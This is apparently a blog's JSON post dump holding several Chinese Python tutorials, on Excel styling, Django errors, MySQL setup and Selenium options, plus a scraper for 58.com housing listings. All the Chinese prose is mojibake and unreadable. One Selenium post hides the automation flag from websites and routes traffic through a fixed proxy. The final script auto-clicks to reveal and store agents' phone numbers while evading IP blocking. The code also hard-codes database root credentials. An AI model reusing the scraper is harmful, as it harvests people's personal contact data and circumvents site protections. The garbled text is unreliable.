æœ€æ–°ç‰ˆæœ¬æ˜¯3.5.4ï¼Œæ ¹æ®æ–‡æ¡£ä»‹ç»ï¼Œæ­¤ç‰ˆæœ¬è¦æ±‚pythonç‰ˆæœ¬æœ€ä½æ˜¯3.5.3ã€‚ è€Œæˆ‘æœ¬åœ°çš„pythonæ˜¯3.5.2ï¼Œé€šè¿‡å®˜ç½‘ä¸‹è½½æ–°çš„pythonå®‰è£…åŒ…ï¼Œç›´æ¥è¦†ç›–å®‰è£…å³å¯ï¼Œä¹‹å‰å®‰è£…çš„ç¬¬ä¸‰æ–¹åº“ä¸ä¼šæœ‰å½±å“ã€‚","categories":[{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://yoursite.com/categories/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"pythonæ“ä½œexcelè®¾ç½®å•å…ƒæ ¼é¢œè‰²","slug":"pythonæ“ä½œexcelè¡¨è®¾ç½®å•å…ƒæ ¼é¢œè‰²","date":"2019-08-06T04:00:00.000Z","updated":"2019-09-11T03:37:02.739Z","comments":true,"path":"2019/08/06/pythonæ“ä½œexcelè¡¨è®¾ç½®å•å…ƒæ ¼é¢œè‰²/","link":"","permalink":"http://yoursite.com/2019/08/06/python%E6%93%8D%E4%BD%9Cexcel%E8%A1%A8%E8%AE%BE%E7%BD%AE%E5%8D%95%E5%85%83%E6%A0%BC%E9%A2%9C%E8%89%B2/","excerpt":"","text":"ä¹‹å‰å†™è¿‡ä¸€ç¯‡æ–‡ç« ä»‹ç»pythonè¯»å–å’Œå†™å…¥excelè¡¨ (ç›´è¾¾é“¾æ¥)ï¼Œå®é™…ä½¿ç”¨ä¸­æœ‰æ—¶å€™éœ€è¦å¯¹æŸäº›å•å…ƒæ ¼è®¾ç½®é¢œè‰²ä»¥çªå‡ºæ˜¾ç¤ºï¼Œä¾‹å¦‚è‡ªåŠ¨åŒ–æµ‹è¯•ä¸­è‡ªåŠ¨å°†excelè¡¨ä¸­å¤±è´¥çš„ç”¨ä¾‹æ ‡çº¢ã€‚ ç»™å•å…ƒæ ¼è®¾ç½®æ ·å¼è¦ç”¨åˆ°xlutilsåº“çš„Stylesæ–¹æ³•ï¼Œå°†æ·»åŠ å•å…ƒæ ¼æ ·å¼ä¸ä¹‹å‰çš„å†™å…¥excelè¡¨ç»“åˆä¸ºå¦‚ä¸‹çš„æ–¹æ³•ã€‚ 12345678910111213141516171819import xlrd,xlwtfrom xlutils.copy import copyfrom xlutils.styles import Stylesdef write_excel(row,colum,content,colour=False): oldWb = xlrd.open_workbook(PATH, formatting_info=True) newWb = copy(oldWb) pattern = xlwt.Pattern() # Create the Pattern pattern.pattern = xlwt.Pattern.SOLID_PATTERN # May be: NO_PATTERN, SOLID_PATTERN, or 0x00 through 0x12 pattern.pattern_fore_colour = 2 # May be: 8 through 63. 0 = Black, 1 = White, 2 = Red, 3 = Green, 4 = Blue, 5 = Yellow, 6 = Magenta, 7 = Cyan, 16 = Maroon, 17 = Dark Green, 18 = Dark Blue, 19 = Dark Yellow , almost brown), 20 = Dark Magenta, 21 = Teal, 22 = Light Gray, 23 = Dark Gray, the list goes on... style = xlwt.XFStyle() # Create the Pattern style.pattern = pattern # Add Pattern to Style newWs = newWb.get_sheet(0) if colour == False: newWs.write(row, colum, content) else: newWs.write(row, colum, content,style) newWb.save(PATH) ä¸Šé¢ä¾‹å­ä¸­æœ‰å››ä¸ªå‚æ•°ï¼š rowï¼šè¡Œï¼Œä»0å¼€å§‹ï¼Œ0ä»£è¡¨çš„ç¬¬ä¸€è¡Œï¼Œæ ¼å¼ä¸ºint columï¼šåˆ—ï¼Œä»0å¼€å§‹ï¼Œ0ä»£è¡¨çš„ç¬¬ä¸€åˆ—ï¼Œæ ¼å¼ä¸ºint contentï¼šè¦å†™å…¥è¡¨æ ¼çš„å†…å®¹ colour: æ˜¯å¦æ·»åŠ å•å…ƒæ ¼é¢œè‰²ï¼Œé»˜è®¤æ˜¯Falseï¼Œè¦æ·»åŠ å°±è®¾ç½®ä¸ºTrue å…¶ä¸­pattern.pattern_fore_colour è®¾ç½®çš„æ•°å­—å°±æ˜¯å•å…ƒæ ¼çš„é¢œè‰²ï¼Œä¸åŒçš„æ•°å­—ä»£è¡¨ä¸åŒçš„é¢œè‰²ã€‚","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"è‡ªåŠ¨æ•´ç†å½“å‰Pythoné¡¹ç›®ä¸­ç”¨åˆ°çš„ç¬¬ä¸‰æ–¹åº“å¹¶è¾“å‡ºrequirementsæ–‡ä»¶","slug":"è‡ªåŠ¨æ•´ç†Pythoné¡¹ç›®ä¸­ç”¨åˆ°çš„ç¬¬ä¸‰æ–¹åº“å¹¶è¾“å‡ºrequirementsæ–‡ä»¶","date":"2019-08-06T04:00:00.000Z","updated":"2019-08-06T12:24:51.837Z","comments":true,"path":"2019/08/06/è‡ªåŠ¨æ•´ç†Pythoné¡¹ç›®ä¸­ç”¨åˆ°çš„ç¬¬ä¸‰æ–¹åº“å¹¶è¾“å‡ºrequirementsæ–‡ä»¶/","link":"","permalink":"http://yoursite.com/2019/08/06/%E8%87%AA%E5%8A%A8%E6%95%B4%E7%90%86Python%E9%A1%B9%E7%9B%AE%E4%B8%AD%E7%94%A8%E5%88%B0%E7%9A%84%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%B9%B6%E8%BE%93%E5%87%BArequirements%E6%96%87%E4%BB%B6/","excerpt":"","text":"å®‰è£…pipreqs1pip install pipreqs ä½¿ç”¨æ–¹æ³•ç›´æ¥åœ¨CMDå‘½ä»¤è¡Œç”¨pipreqs + è·¯å¾„, ä¾‹å¦‚å½“å‰åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1pipreqs .&#x2F; ç­‰å¾…ç‰‡åˆ»åå°±ä¼šåœ¨å½“å‰è·¯å¾„ä¸‹ç”Ÿæˆrequirementsæ–‡ä»¶ã€‚ æŠ¥é”™å¤„ç†å¦‚æœæ‰§è¡Œä¸Šé¢å‘½ä»¤æ—¶æŠ¥é”™UnicodeDecodeError: &#39;gbk&#39; codec can&#39;t decode byte 0xa1 in position 182: illegal multibyte sequence æ ¹æ®æç¤ºä¿¡æ¯ï¼Œåœ¨pythonå®‰è£…è·¯å¾„æ‰¾åˆ°pipreqs.pyæ–‡ä»¶ï¼Œç¬¬74è¡Œï¼ˆpipreqsä¸åŒç‰ˆæœ¬è¡Œæ•°å¯èƒ½ä¸ä¸€æ ·ï¼‰ï¼Œå°†encodingè®¾ç½®ä¸º&#39;utf-8&#39;ï¼Œç„¶åå†æ‰§è¡Œå°±ä¸ä¼šæŠ¥é”™ã€‚","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"}]},{"title":"ä½¿ç”¨seleniumåšè‡ªåŠ¨åŒ–å’Œçˆ¬è™«æ—¶çš„å‡ ä¸ªå¸¸ç”¨è®¾ç½®","slug":"seleniumçˆ¬è™«çš„å‡ ä¸ªå¸¸ç”¨è®¾ç½®","date":"2019-07-18T04:00:00.000Z","updated":"2019-10-08T13:32:23.695Z","comments":true,"path":"2019/07/18/seleniumçˆ¬è™«çš„å‡ ä¸ªå¸¸ç”¨è®¾ç½®/","link":"","permalink":"http://yoursite.com/2019/07/18/selenium%E7%88%AC%E8%99%AB%E7%9A%84%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839from selenium import webdriverfrom selenium.webdriver.common.by import Byfrom selenium.webdriver.support.wait import WebDriverWaitfrom selenium.webdriver.support import expected_conditions as ECimport timeurl = 'http://www.xxxxx.com/login.html'chrome_options = webdriver.ChromeOptions()# è®¾ç½®ä¸ºå¼€å‘è€…æ¨¡å¼è®¿é—®ï¼Œé˜²æ­¢è¢«ç½‘ç«™è¯†åˆ«å‡ºæ¥æ˜¯seleniumchrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])# è®¾ç½®æµè§ˆå™¨ä¸åŠ è½½å›¾ç‰‡ï¼Œä»è€ŒåŠ å¿«é¡µé¢åŠ è½½é€Ÿåº¦prefs = &#123;\"profile.managed_default_content_settings.images\": 2&#125;chrome_options.add_experimental_option(\"prefs\", prefs)# æ·»åŠ ä»£ç†chrome_options.add_argument('--proxy-server=http://101.37.79.125:3128') #æ·»åŠ ä»£ç†# è¾¾åˆ°ç›®æ ‡ååœæ­¢åŠ è½½capa = DesiredCapabilities.CHROMEcapa[\"pageLoadStrategy\"] = \"none\" #æ‡’åŠ è½½æ¨¡å¼ï¼Œä¸ç­‰å¾…é¡µé¢åŠ è½½å®Œæ¯•# è®¾ç½®æ—¥å¿—ç­‰çº§chrome_options.add_argument('log-level=3') # INFO = 0 WARNING = 1 LOG_ERROR = 2 LOG_FATAL = 3 default is 0# chrome-headerlessæ¨¡å¼chrome_options.add_argument('--headless')# æ‰‹æœºæ¨¡å¼æ‰“å¼€æµè§ˆå™¨mobile_emulation = &#123;'deviceName': 'iPhone 6'&#125;chrome_options.add_experimental_option(\"mobileEmulation\", mobile_emulation)# å¯åŠ¨chromeæµè§ˆå™¨driver = webdriver.Chrome(chrome_options=chrome_options,desired_capabilities=capa) #desired_capabilitieså‚æ•°å°±æ˜¯ä¸Šé¢è®¾ç½®çš„ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®å°±ä¸åŠ driver.get(url)cookies = driver.get_cookies()","categories":[{"name":"è‡ªåŠ¨åŒ–","slug":"è‡ªåŠ¨åŒ–","permalink":"http://yoursite.com/categories/%E8%87%AA%E5%8A%A8%E5%8C%96/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"selenium","slug":"selenium","permalink":"http://yoursite.com/tags/selenium/"}]},{"title":"Django2.0åœ¨modelsåˆ›å»ºæ•°æ®è¡¨æ—¶æŠ¥é”™","slug":"django2.0åˆ›å»ºæ–°è¡¨æŠ¥é”™","date":"2019-07-09T12:00:00.000Z","updated":"2019-07-09T12:38:39.328Z","comments":true,"path":"2019/07/09/django2.0åˆ›å»ºæ–°è¡¨æŠ¥é”™/","link":"","permalink":"http://yoursite.com/2019/07/09/django2.0%E5%88%9B%E5%BB%BA%E6%96%B0%E8%A1%A8%E6%8A%A5%E9%94%99/","excerpt":"","text":"Django2.0åœ¨modelsåˆ›å»ºæ•°æ®è¡¨æ—¶æŠ¥é”™TypeError: __init__() missing 1 required positional argument: &#39;on_delete&#39; å¦‚ä¸‹åˆ›å»ºäº†ä¸¤ä¸ªè¡¨ï¼ŒTag è¡¨ä»¥ Contact è¡¨ä¸ºå¤–éƒ¨é”®ï¼Œæ­¤æ—¶å¯ä»¥çœ‹åˆ°pycharmæ§åˆ¶å°æŠ¥é”™ 123456789101112131415class Contact(models.Model): name = models.CharField(max_length=200) age = models.IntegerField(default=0) email = models.EmailField() def __unicode__(self): return self.nameclass Tag(models.Model): contact = models.ForeignKey(Contact) # on_delete=models.DO_NOTHING name = models.CharField(max_length=50) def __unicode__(self): return self.name è¿™æ˜¯ç”±äºDjango2.0ä¹‹åå®šä¹‰å¤–é”®éœ€è¦åŠ ä¸Šon_deleteå‚æ•°, æ­¤å‚æ•°æ˜¯ä¸ºäº†é¿å…ä¸¤ä¸ªè¡¨é‡Œé¢æ•°æ®ä¸ä¸€è‡´çš„é—®é¢˜ï¼Œ2.0ä¹‹å‰çš„ç‰ˆæœ¬on_deleteå‚æ•°æœ‰ä¸ªé»˜è®¤å€¼models.CASCADEï¼Œ2.0åŠä¹‹åä¸å†é»˜è®¤ï¼Œä¸æ‰‹åŠ¨åŠ ä¸Šçš„è¯ä¼šæŠ¥é”™ã€‚å¦‚ä¸‹æ·»åŠ on_delete = models.CASCADE æˆ–è€… on_delete = models.DO_NOTHING å³å¯ã€‚ 123456789101112131415class Contact(models.Model): name = models.CharField(max_length=200) age = models.IntegerField(default=0) email = models.EmailField() def __unicode__(self): return self.nameclass Tag(models.Model): contact = models.ForeignKey(Contact,on_delete=models.DO_NOTHING) # è®¾ç½®on_deleteå‚æ•° name = models.CharField(max_length=50) def __unicode__(self): return self.name","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"django","slug":"django","permalink":"http://yoursite.com/tags/django/"}]},{"title":"python3ç¯å¢ƒä¸‹djangoä½¿ç”¨MySQLæ•°æ®åº“","slug":"python3ç¯å¢ƒä¸‹djangoä½¿ç”¨MySQLæ•°æ®åº“","date":"2019-07-08T04:00:00.000Z","updated":"2019-07-09T11:46:27.162Z","comments":true,"path":"2019/07/08/python3ç¯å¢ƒä¸‹djangoä½¿ç”¨MySQLæ•°æ®åº“/","link":"","permalink":"http://yoursite.com/2019/07/08/python3%E7%8E%AF%E5%A2%83%E4%B8%8Bdjango%E4%BD%BF%E7%94%A8MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"","text":"å®‰è£…PyMySQL1pip install PyMySQL ä¿®æ”¹settings.pyæ–‡ä»¶å°†Djangoåˆ›å»ºé¡¹ç›®æ—¶è‡ªå¸¦çš„æ•°æ®åº“é…ç½®æ³¨é‡Šæ‰ï¼Œæ·»åŠ MySQLé…ç½®å¦‚ä¸‹ 12345678910111213141516171819# æ³¨é‡Šæ‰Djangoè‡ªå¸¦çš„æ•°æ®åº“é…ç½®# DATABASES = &#123;# 'default': &#123;# 'ENGINE': 'django.db.backends.sqlite3',# 'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),# &#125;# &#125;# ä½¿ç”¨mysqlé…ç½®DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.mysql', # å›ºå®šæ ¼å¼ 'NAME': 'testDB', # æ•°æ®åº“åç§° 'USER': 'root', # è¿æ¥ç”¨æˆ·å 'PASSWORD': 'å¯†ç ', # è¿æ¥å¯†ç  'HOST':'127.0.0.1', # è¿æ¥IP 'PORT':'3306', # è¿æ¥ç«¯æ‰£ &#125;&#125; ä¿®æ”¹__init__.pyæ–‡ä»¶åˆ›å»ºDjangoé¡¹ç›®æ—¶ï¼Œé¡¹ç›®ç›®å½•ä¸‹ï¼Œä¹Ÿå°±æ˜¯settings.pyæ‰€åœ¨çš„ç›®å½•ä¸‹ï¼Œä¼šæœ‰ä¸€ä¸ª__init__.pyæ–‡ä»¶ï¼Œæ²¡æœ‰çš„è¯æ‰‹åŠ¨åˆ›å»ºï¼Œåœ¨æ–‡ä»¶ä¸­æ·»åŠ å¦‚ä¸‹ã€‚ 12import pymysqlpymysql.install_as_MySQLdb()","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"django","slug":"django","permalink":"http://yoursite.com/tags/django/"},{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"pythonå‘½ä»¤è¡Œä¼ é€’å‚æ•°","slug":"pythonå‘½ä»¤è¡Œä¼ é€’å‚æ•°","date":"2019-05-21T12:00:00.000Z","updated":"2019-10-08T13:32:40.900Z","comments":true,"path":"2019/05/21/pythonå‘½ä»¤è¡Œä¼ é€’å‚æ•°/","link":"","permalink":"http://yoursite.com/2019/05/21/python%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BC%A0%E9%80%92%E5%8F%82%E6%95%B0/","excerpt":"","text":"ä½¿ç”¨sysæ¨¡å— 12345import sysargs = list(sys.argv) #å°†å‘½ä»¤è¡Œä¼ çš„å‚æ•°å¼„åœ¨åˆ—è¡¨ä¸­print(args) #æ‰“å°å‘½ä»¤è¡Œä¸­çš„å‚æ•°print(type(args)) ä¾‹å¦‚åœ¨CMDå‘½ä»¤è¡Œä¸­è¾“å…¥ä»¥ä¸‹å‘½ä»¤ 1python baidu.py å›é”…è‚‰ ç»“æœä¸º 12[&#39;baidu.py&#39;,&#39;å›é”…è‚‰&#39;]&lt;class &#39;list&#39;&gt; å³pythonåé¢çš„ä¸¤ä¸ªå‚æ•°éƒ½æ‰“å°å‡ºæ¥ï¼Œæ˜¯ä¸ªåˆ—è¡¨ï¼Œå°±å¯ä»¥åœ¨ä»£ç ä¸­å°†åˆ—è¡¨çš„å‚æ•°å–å‡ºæ¥å¸¦å…¥éœ€è¦çš„å‡½æ•°ä¸­","categories":[{"name":"æµ‹è¯•","slug":"æµ‹è¯•","permalink":"http://yoursite.com/categories/%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"cmd","slug":"cmd","permalink":"http://yoursite.com/tags/cmd/"}]},{"title":"seleniumçˆ¬å–58åŒåŸæ‰‹æœºå·","slug":"seleniumçˆ¬å–58åŒåŸæ‰‹æœºå·","date":"2019-01-10T12:00:00.000Z","updated":"2019-01-14T09:44:46.034Z","comments":true,"path":"2019/01/10/seleniumçˆ¬å–58åŒåŸæ‰‹æœºå·/","link":"","permalink":"http://yoursite.com/2019/01/10/selenium%E7%88%AC%E5%8F%9658%E5%90%8C%E5%9F%8E%E6%89%8B%E6%9C%BA%E5%8F%B7/","excerpt":"","text":"ä»¥äºŒæ‰‹æˆ¿æ¿å—ä¸ºä¾‹ï¼ŒæŠ“å–äºŒæ‰‹æˆ¿æºä¿¡æ¯å’Œç»çºªäººçš„è”ç³»ç”µè¯ã€‚é¦–å…ˆæŠ“å–æ‰€æœ‰æˆ¿æºè¯¦æƒ…é“¾æ¥ï¼Œå†è®¿é—®æ¯ä¸ªé“¾æ¥æŠ“å–æˆ¿æºè¯¦æƒ…ä¿å­˜åˆ°æ•°æ®åº“ã€‚ ä¸€ã€è·å–åˆ—è¡¨é¡µæ‰€æœ‰äºŒæ‰‹æˆ¿æºè¯¦æƒ…é“¾æ¥é‡åº†åœ°åŒºå…±70é¡µï¼Œè§£ææ¯é¡µçš„æˆ¿æºè¯¦æƒ…åœ°å€å¹¶ä¿å­˜åˆ°æœ¬åœ°ã€‚ 1234567891011121314151617181920212223242526import requests,lxml,timefrom bs4 import BeautifulSoupdef get_all_link(): ''' 58åŒåŸé‡åº†åœ°åŒºã€æˆ¿äº§æ¿å— - äºŒæ‰‹æˆ¿ã€‘çš„æˆ¿æºè¯¦æƒ…åœ°å€ ''' for i in range(1,71): url = 'https://cq.58.com/ershoufang/pn%d/' %i #æˆ¿æºåˆ—è¡¨é¡µ web_data = requests.get(url) soup = BeautifulSoup(web_data.text,'lxml') fang_links = soup.select('body &gt; div.main-wrap &gt; div.content-wrap &gt; div.content-side-left &gt; ul &gt; li &gt; div.list-info &gt; h2 &gt; a') for fang_link in fang_links: fang_link = fang_link.get('href') #aæ ‡ç­¾çš„hrefå±æ€§å€¼å°±æ˜¯éœ€è¦çš„æˆ¿æºè¯¦æƒ…é¡µçš„URL print(fang_link) if fang_link.startswith('//') == True: #åˆ¤æ–­æ˜¯å¦æ˜¯//å¼€å¤´çš„é“¾æ¥ï¼Œæ˜¯çš„è¯ç›´æ¥è·³è¿‡ï¼Œè¿™ç§seleniumæ— æ³•ç›´æ¥é€šè¿‡urlè¿›å…¥ print('URLä¸ç¬¦åˆè§„åˆ™ï¼Œè·³è¿‡') continue else: pass with open(r\"C:\\Users\\Administrator\\Desktop\\58_ershoufang_link.txt\",'a+') as f: f.write(fang_link + '\\n') #å†™å…¥æœ¬åœ°txtæ–‡ä»¶ f.close() print('ç¬¬%dé¡µæŠ“å–å®Œæ¯•'%i,' ') print('å…±%dæ¡'%(len(fang_links))) time.sleep(1) #æ¯é¡µæŠ“å–å®Œæ¯•ç­‰å¾…1ç§’ï¼Œé˜²æ­¢IPè¢«é™åˆ¶ äºŒã€åˆ†æå¹¶æŠ“å–è¯¦æƒ…é¡µé¢1.åŸºæœ¬ä¿¡æ¯å³é”®æ£€æŸ¥å…ƒç´ ï¼Œæ ‡é¢˜ï¼Œæˆ·å‹ï¼Œé¢ç§¯ï¼Œæœå‘ç­‰éƒ½æ¯”è¾ƒç®€å•çš„å®¹æ˜“è·å–åˆ°ï¼Œç›´æ¥ç”¨requestsè·å–æºç ï¼Œç„¶åBeautifulSoupè§£æå³å¯ã€‚ 2.è·å–å”®ä»·ä½†æ˜¯æ€»ä»·å’Œæ¯å¹³ç±³å”®ä»·å´æ˜¯ä¹±ç çš„ï¼Œè¿™æ˜¯ç”±äº58æœ‰ä¸€å¥—è‡ªå®šä¹‰çš„å­—ä½“åœ¨åœ¨è¿™é‡Œæ›¿æ¢é¡µé¢ä¸­çš„æ•°å­—ï¼Œè€Œä¸”æ¯æ¬¡åˆ·æ–°éƒ½æ˜¯éšæœºï¼Œè¦è·å–åˆ°çœŸå®çš„ä»·é’±ï¼Œé¦–å…ˆè¦è§£æ58çš„è‡ªå®šä¹‰å­—ä½“ä¸æ•°å­—0-9çš„ä¸€ä¸€å¯¹åº”å…³ç³»ï¼Œå†è®²æŠ“å–åˆ°çš„è‡ªå®šä¹‰å­—ä½“æ›¿æ¢ä¸ºå¯¹åº”çš„æ•°å­—ï¼Œåé¢ä¸“é—¨å†™ä¸€ç¯‡æ–‡ç« ä»‹ç»ã€‚ æµè§ˆç½‘é¡µç»“æ„å‘ç°ï¼Œheaderæ ‡ç­¾ä¸‹çš„ç¬¬äºŒä¸ªmetaæ ‡ç­¾æœ‰ä¸€äº›ç®€ä»‹æè¿°ï¼Œå…¶ä¸­å°±åŒ…å«äº†æ€»ä»·å’Œæ¯å¹³ç±³å”®ä»·ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªæ ‡ç­¾çš„å†…å®¹æŠ“å–ä¸‹æ¥å–å‡ºå…¶ä¸­çš„æ•°å­—å³å¯ï¼Œå…å»äº†è§£æ58è‡ªå®šä¹‰å­—ä½“çš„éº»çƒ¦ã€‚ 3.è·å–æ‰‹æœºå·æ‰‹æœºå·ç ä¸æ˜¯ç›´æ¥å±•ç¤ºåœ¨é¡µé¢ï¼Œéœ€è¦æ‰‹åŠ¨ç‚¹å‡»â€ç”µè¯è”ç³»TAâ€æ‰èƒ½æ˜¾ç¤ºï¼Œæ‰“å¼€æ§åˆ¶å°å¯ä»¥çœ‹åˆ°ï¼Œç‚¹å‡»æŒ‰é’®åå‘é€äº†ä¸¤ä¸ªJSè¯·æ±‚ï¼Œç¬¬äºŒä¸ªè¯·æ±‚è¿”å›çš„jsonå€¼å°±åŒ…å«äº†æ‰‹æœºå·ï¼Œç¬¬ä¸€æƒ³æ³•å°±æ˜¯é€šè¿‡pythonçš„requestsç›´æ¥æ¨¡æ‹Ÿè¿™ä¸ªè¯·æ±‚æ¥è·å–æ‰‹æœºå·ï¼Œä½†æ˜¯ä»”ç»†è§‚å¯Ÿå‘ç°è¿™ä¸ªGETè¯·æ±‚çš„å‚æ•°æ˜¯åŠ å¯†çš„ï¼Œè¦çŒœè§£å­—æ®µæœ‰ç‚¹éš¾åº¦ï¼Œè€Œä¸”è°ƒè¯•è¿‡ç¨‹ä¸­å‘ç°ç›´æ¥è¯·æ±‚æ¥å£é€Ÿåº¦å¤ªå¿«ä¼šè¢«é¢‘ç¹å°IPï¼Œæœ¬ç€åŒ–ç¹ä¸ºç®€çš„åŸåˆ™ï¼Œç›´æ¥ä½¿ç”¨seleniumæ§åˆ¶æµè§ˆå™¨æ¨¡æ‹Ÿç‚¹å‡»è¿™ä¸ªæŒ‰é’®åï¼Œè·å–ç‚¹å‡»åçš„ç½‘é¡µæºç ï¼Œå†è§£æhtmlä¸­çš„æ‰‹æœºå·ã€‚ 4.ä»£ç å®ä¾‹å› ä¸ºè¦ç‚¹å‡»æŸ¥çœ‹æ‰‹æœºå·ï¼Œæ‰€ä»¥ä¸å†ä½¿ç”¨requestsè·å–ç½‘é¡µæºç ï¼Œä½¿ç”¨selenium + chromedriverè·å–ç½‘é¡µæºç ï¼ŒæŠ“å–åˆ°çš„ä¿¡æ¯å†™å…¥æ•°æ®åº“ï¼Œå‰ææ˜¯ä¸‹è½½æœ¬æœºchromeæµè§ˆå™¨å¯¹åº”çš„chromedriveré©±åŠ¨æ”¾åœ¨pythonå¯æ‰§è¡Œè·¯å¾„ä¸‹ã€‚ 1234567891011121314151617181920212223242526272829import pymysqldef write_sql(sql): ''' å°†æŠ“å–çš„æ•°æ®å†™å…¥mydqlæ•°æ®åº“ ''' try: db = pymysql.Connect(host='localhost',port=3306,user='root',password='123456',db='58_ershoufang') except: print('æ•°æ®åº“é“¾æ¥å¤±è´¥') pass # ä½¿ç”¨cursor()æ–¹æ³•è·å–æ“ä½œæ¸¸æ ‡ cursor = db.cursor() # SQL æ’å…¥è¯­å¥ try: # æ‰§è¡Œsqlè¯­å¥ cursor.execute(\"set names 'utf8'\") #ä¸­æ–‡å†™å…¥å¤±è´¥çš„æ—¶å€™åŠ ä¸Šè¿™å¥ cursor.execute(sql.encode('utf8')) # cursor.execute(sql) # æäº¤åˆ°æ•°æ®åº“æ‰§è¡Œ db.commit() except Exception as e: print(e) # å¦‚æœå‘ç”Ÿé”™è¯¯åˆ™å›æ»š db.rollback() # å…³é—­æ•°æ®åº“è¿æ¥ db.close() æŠ“å–æˆ¿æºè¯¦æƒ…1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from selenium.webdriver.chrome.options import Optionsfrom selenium import webdriverimport requests,lxml,timefrom bs4 import BeautifulSoupimport pymysqldef get_detail_info(): ''' ä¾æ¬¡ä»ä¸Šä¸€ä¸ªå‡½æ•°ä¸­ä¿å­˜çš„æ‰€æœ‰æˆ¿æºåœ°å€è¿›å…¥è¯¦æƒ…é¡µé¢ï¼Œè·å–æˆ¿äº§è¯¦ç»†ä¿¡æ¯ ''' chrome_options = webdriver.ChromeOptions() prefs = &#123;\"profile.managed_default_content_settings.images\": 2&#125; #è®¾ç½®æµè§ˆå™¨ä¸åŠ è½½å›¾ç‰‡ï¼Œä»è€ŒåŠ å¿«é¡µé¢åŠ è½½é€Ÿåº¦ chrome_options.add_experimental_option(\"prefs\", prefs) chrome_options.add_argument('--headless') #chrome-headerlessæ¨¡å¼ driver = webdriver.Chrome(chrome_options=chrome_options) #å¯åŠ¨chromeæµè§ˆå™¨ with open(r\"C:\\Users\\Administrator\\Desktop\\58_ershoufang_link.txt\",'r') as f: lines = f.readlines() for line in lines: house_info = [] driver.get(line) time.sleep(0.5) print(lines.index(line)+1) html = driver.page_source #è·å–ç½‘é¡µæºç  if \"ä½ è¦æ‰¾çš„é¡µé¢ä¸åœ¨è¿™ä¸ªæ˜Ÿçƒä¸Šï¼\" in html: print('è¯¥æˆ¿æºå·²ç»ä¸‹æ¶') print('=' * 50) continue else: driver.find_element_by_css_selector('#houseChatEntry &gt; div &gt; p.chat-phone-layer.show-phone').click() # ç‚¹å‡»æŸ¥çœ‹æ‰‹æœºå· time.sleep(0.3) soup = BeautifulSoup(driver.page_source,'lxml') #BeautifulSoupè§£æ #é¡µé¢header &gt; metaæ ‡ç­¾ä¸­æœ‰ä¸€äº›æè¿°ä¿¡æ¯,åŒ…æ‹¬å”®ä»· description = soup.select('head &gt; meta:nth-of-type(2)')[0].get('content').split(\";\") #ä»æè¿°ä¿¡æ¯å­—ç¬¦ä¸²ä¸­æˆªå–æˆ¿æºæ ‡é¢˜ï¼Œæ€»å”®ä»·ï¼Œæ¯å¹³ç±³å”®ä»· title = description[0] #æˆ¿æºæ ‡é¢˜ price_all = description[1].split('ï¼š')[1].split('å…ƒï¼ˆ')[0] #æ€»å”®ä»· price_per = description[1].split('ï¼š')[1].split('å…ƒï¼ˆ')[1].split('ï¼‰')[0] #æ¯å¹³ç±³å”®ä»· #selectæ–¹æ³•åœ¨é¡µé¢ç»“æ„ä¸­é€‰æ‹©å…¶ä½™éœ€è¦æŠ“å–çš„å­—æ®µï¼Œæœ‰äº›å­—æ®µä¸æ˜¯æ¯ä¸ªæˆ¿æºä¿¡æ¯éƒ½æœ‰çš„ï¼Œä¸å­˜åœ¨çš„æ—¶å€™ç›´æ¥è®¾ç½®ä¸ºç©º house_xiaoqu = soup.select('body &gt; div.main-wrap &gt; div.house-basic-info.clearfix &gt; div.house-basic-right.fr &gt; ul &gt; li:nth-of-type(1) &gt; span.c_000.mr_10') #æ‰€åœ¨å°åŒº house_xiaoqu = ' - '.join(i.text.strip().replace('\\n','').replace(' ','').replace('-','') for i in house_xiaoqu) #æ•´ç†å°åŒºæ ¼å¼ house_address = soup.select('body &gt; div.main-wrap &gt; div.house-basic-info.clearfix &gt; div.house-basic-right.fr &gt; ul &gt; li:nth-of-type(2) &gt; span.c_000.mr_10') #æ‰€åœ¨åœ°å€ house_address = ' - '.join(i.text.strip().replace('\\n','').replace(' ','').replace('-','') for i in house_address) #æ•´ç†åœ°å€æ ¼å¼ try: broker_name = soup.select('div.agent-name.agent-little.f14.c_555 &gt; a')[0].text.strip() #ç»çºªäººåç§° except: broker_name = '' #ç»çºªäººåç§°ä¸å­˜åœ¨çš„è¯èµ‹å€¼ä¸ºç©º 